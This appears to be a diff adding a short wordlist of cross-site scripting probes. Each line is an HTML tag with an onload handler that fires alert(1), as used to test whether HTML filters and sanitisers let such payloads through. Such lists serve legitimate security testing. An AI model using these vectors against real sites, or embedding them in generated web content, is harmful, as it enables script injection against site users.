@@ -1,0 +1,16 @@
+<body onload=alert(1)>
+<img src=validimage.png onload=alert(1)>
+<embed src=/ onload=alert(1)>
+<script onload=alert(1) src=validjs.js></script>
+<link href=validstyles.css rel=stylesheet onload=alert(1)>
+<style onload=alert(1)></style>
+<isindex type=image onload=alert(1) src=validimage.png>
+<svg onload=alert(1)>
+<frameset><frame onload=alert(1)>
+<iframe onload=alert(1)></iframe>
+<image src=validimage.png onload=alert(1)>
+<input type=image src=validimage.png onload=alert(1)>
+<picture><source srcset="validimage.png"><image onload=alert(1)></picture>
+<svg><image href=validimage.png onload=alert(1)>
+<isindex type=image onload=alert(1) src=validimage.png>
+<video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
